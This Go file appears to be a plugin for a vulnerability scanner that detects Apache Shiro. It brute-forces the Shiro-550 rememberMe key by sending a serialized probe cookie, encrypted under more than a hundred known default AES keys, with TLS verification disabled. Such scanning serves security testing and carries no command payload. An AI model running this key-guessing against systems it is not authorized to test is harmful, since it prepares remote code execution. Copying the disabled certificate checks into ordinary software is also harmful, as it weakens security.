package Java

import (
	"crypto/tls"
	"encoding/base64"
	"jray/addon/BugCheck/Common"
	"net/http"
	"strings"
	"sync"
	"time"
)

func init() {
	Common.AddBugScanListPerFile(Shiro550Scan{Common.PluginBase{Name: "Shiro", Desc: "发现shiro框架，可利用shiro框架进行反序列化，执行系统命令", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}, 0, 5, &[]string{}, &sync.Mutex{}})
}

type Shiro550Scan struct {
	Common.PluginBase
	ExceptionCount int
	ExceptionMax   int
	ShiroHosts     *[]string
	Metux          *sync.Mutex
}

func (p Shiro550Scan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
	p.Request = request
	p.Response = response
	p.Audit()
}

var (
	Shirokeys = []string{"2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "zSyK5Kp6PZAAjlT+eeNMlg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "bXdrXl9eNjY2KjA3Z2otPQ==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA==", "GsHaWo4m1eNbE0kNSMULhg==", "l8cc6d2xpkT1yFtLIcLHCg==", "KU471rVNQ6k7PQL4SqxgJg==", "0AvVhmFLUs0KTA3Kprsdag==", "1AvVhdsgUs0FSA3SDFAdag==", "25BsmdYwjnfcWmnhAciDDg==", "3JvYhmBLUs0ETA5Kprsdag==", "6AvVhmFLUs0KTA3Kprsdag==", "6NfXkC7YVCV5DASIrEm1Rg==", "7AvVhmFLUs0KTA3Kprsdag==", "8AvVhmFLUs0KTA3Kprsdag==", "8BvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==", "OUHYQzxQ/W9e/UjiAGu6rg==", "a3dvbmcAAAAAAAAAAAAAAA==", "aU1pcmFjbGVpTWlyYWNsZQ==", "bXRvbnMAAAAAAAAAAAAAAA==", "OY//C4rhfwNxCQAQCrQQ1Q==", "5J7bIJIV0LQSN3c9LPitBQ==", "f/SY5TIve5WWzT4aQlABJA==", "bya2HkYo57u6fWh5theAWw==", "WuB+y2gcHRnY2Lg9+Aqmqg==", "3qDVdLawoIr1xFd6ietnwg==", "YI1+nBV//m7ELrIyDHm6DQ==", "6Zm+6I2j5Y+R5aS+5ZOlAA==", "2A2V+RFLUs+eTA3Kpr+dag==", "6ZmI6I2j3Y+R1aSn5BOlAA==", "SkZpbmFsQmxhZGUAAAAAAA==", "2cVtiE83c4lIrELJwKGJUw==", "fsHspZw/92PrS3XrPW+vxw==", "XTx6CKLo/SdSgub+OPHSrw==", "sHdIjUN6tzhl8xZMG3ULCQ==", "O4pdf+7e+mZe8NyxMTPJmQ==", "HWrBltGvEZc14h9VpMvZWw==", "rPNqM6uKFCyaL10AK51UkQ==", "Y1JxNSPXVwMkyvES/kJGeQ==",
		"lT2UvDUmQwewm6mMoiw4Ig==", "kPH+bIxk5D2deZiIxcaaaA==", "MPdCMZ9urzEA50JDlDYYDg==", "xVmmoltfpb8tTceuT5R7Bw==", "c+3hFGPjbgzGdrC+MHgoRQ==", "ClLk69oNcA3m+s0jIMIkpg==", "Bf7MfkNR0axGGptozrebag==", "1tC/xrDYs8ey+sa3emtiYw==", "ZmFsYWRvLnh5ei5zaGlybw==", "cGhyYWNrY3RmREUhfiMkZA==", "IduElDUpDDXE677ZkhhKnQ==", "yeAAo1E8BOeAYfBlm4NG9Q==", "cGljYXMAAAAAAAAAAAAAAA==", "2itfW92XazYRi5ltW0M2yA==", "XgGkgqGqYrix9lI6vxcrRw==", "ertVhmFLUs0KTA3Kprsdag==", "5AvVhmFLUS0ATA4Kprsdag==", "s0KTA3mFLUprK4AvVhsdag==", "hBlzKg78ajaZuTE0VLzDDg==", "9FvVhtFLUs0KnA3Kprsdyg==", "d2ViUmVtZW1iZXJNZUtleQ==", "yNeUgSzL/CfiWw1GALg6Ag==", "NGk/3cQ6F5/UNPRh8LpMIg==", "4BvVhmFLUs0KTA3Kprsdag==", "MzVeSkYyWTI2OFVLZjRzZg==", "empodDEyMwAAAAAAAAAAAA==", "A7UzJgh1+EWj5oBFi+mSgw==", "c2hpcm9fYmF0aXMzMgAAAA==", "i45FVt72K2kLgvFrJtoZRw==", "U3BAbW5nQmxhZGUAAAAAAA==", "Jt3C93kMR9D5e8QzwfsiMw==", "MTIzNDU2NzgxMjM0NTY3OA==", "vXP33AonIp9bFwGl7aT7rA==", "V2hhdCBUaGUgSGVsbAAAAA==", "Q01TX0JGTFlLRVlfMjAxOQ==", "Is9zJ3pzNh2cgTHB4ua3+Q==", "NsZXjXVklWPZwOfkvk6kUA==", "GAevYnznvgNCURavBhCr1w==", "66v1O8keKNV3TTcGPK1wzg==", "SDKOLKn2J1j/2BHjeZwAoQ==", "kPH+bIxk5D2deZiIxcabaA==", "kPH+bIxk5D2deZiIxcacaA==", "3AvVhdAgUs0FSA4SDFAdBg==", "4AvVhdsgUs0F563SDFAdag==", "FL9HL9Yu5bVUJ0PDU1ySvg==", "5RC7uBZLkByfFfJm22q/Zw==", "eXNmAAAAAAAAAAAAAAAAAA==", "fdCEiK9YvLC668sS43CJ6A==", "FJoQCiz0z5XWz2N2LyxNww==", "HeUZ/LvgkO7nsa18ZyVxWQ==", "HoTP07fJPKIRLOWoVXmv+Q==", "iycgIIyCatQofd0XXxbzEg==", "m0/5ZZ9L4jjQXn7MREr/bw==", "NoIw91X9GSiCrLCF03ZGZw==", "oPH+bIxk5E2enZiIxcqaaA==", "QAk0rp8sG0uJC4Ke2baYNA==", "Rb5RN+LofDWJlzWAwsXzxg==", "s2SE9y32PvLeYo+VGFpcKA==", "SrpFBcVD89eTQ2icOD0TMg==", "U0hGX2d1bnMAAAAAAAAAAA==", "Us0KvVhTeasAm43KFLAeng==", "Ymx1ZXdoYWxlAAAAAAAAAA==", "YWJjZGRjYmFhYmNkZGNiYQ==", "zIiHplamyXlVB11UXWol8g==", "ZjQyMTJiNTJhZGZmYjFjMQ=="}
	CheckContent = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
)

func (shiro *Shiro550Scan) HttpRequset(RememberMe string, urll string) (bool, error) {
	//设置跳过https证书验证，超时和代理
	var tr *http.Transport
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   time.Duration(shiro.TimeOut) * time.Second,
		Transport: tr,
	}
	req, err := http.NewRequest(strings.ToUpper(shiro.Request.Method), urll, strings.NewReader(string(shiro.Request.Body)))
	if err != nil {
		return false, err
	}
	if shiro.Request.Header != nil {
		for k, _ := range shiro.Request.Header {
			req.Header.Set(k, shiro.Request.Header.Get(k))
		}
	}
	req.Header.Set("Cookie", "rememberMe="+RememberMe)
	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println(err)
		return false, err
	}
	defer resp.Body.Close()
	//判断rememberMe=deleteMe;是否在响应头中
	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}
	if !strings.Contains(SetCookieAll, "rememberMe=deleteMe;") {
		return true, nil //内容中不包含rememberMe
	} else {
		return false, nil
	}
}
func (shiro *Shiro550Scan) FindTheKey(Shirokey string, Content []byte, url string) (bool, string) {

	//println("check shiro:" + Shirokey)
	key, _ := base64.StdEncoding.DecodeString(Shirokey)
	RememberMe1 := Common.AES_CBC_Encrypt(key, Content) //AES CBC加密
	result1, err := shiro.HttpRequset(RememberMe1, url)
	if err == nil {
		if result1 {
			return true, "CBC"
		}
	} else {
		shiro.ExceptionCount++
	}

	RememberMe2 := Common.AES_GCM_Encrypt(key, Content) //AES GCM加密
	result2, err2 := shiro.HttpRequset(RememberMe2, url)
	if err2 == nil {
		if result2 {
			return true, "GCM"
		}
	} else {
		shiro.ExceptionCount++
	}

	return false, ""
}
func (shiro *Shiro550Scan) PocCheckByUrl(url string) (string, bool) {
	Content, _ := base64.StdEncoding.DecodeString(CheckContent)
	for _, key := range Shirokeys {
		isTrue, aesMode := shiro.FindTheKey(key, Content, url)
		if isTrue {
			Ext := "[+] ApacheShiro反序列化 url:" + url + " shiroKey:" + key + " aesMode:" + aesMode
			return Ext, true
		}
		if shiro.ExceptionCount > shiro.ExceptionMax {
			return "", false
		}
	}
	return "", true
}

func (p Shiro550Scan) Audit() {
	p.Metux.Lock()
	for _, host := range *p.ShiroHosts {
		if p.Request.URL.Host == host {
			p.Metux.Unlock()
			return
		}
	}

	urll := p.Request.URL.String()
	reee, err := p.HttpRequset("123", urll)
	if reee || err != nil {
		p.Metux.Unlock()
		return
	}
	*p.ShiroHosts = append(*p.ShiroHosts, p.Request.URL.Host)
	p.Metux.Unlock()

	key, b := p.PocCheckByUrl(urll)
	if b {
		if key == "" {
			p.Success(p.Name, urll, "INFO", "发现shiro框架", key)
		} else {
			p.Success("Shiro反序列化漏洞", urll, "RCE", p.Desc, key)
		}
	}

}
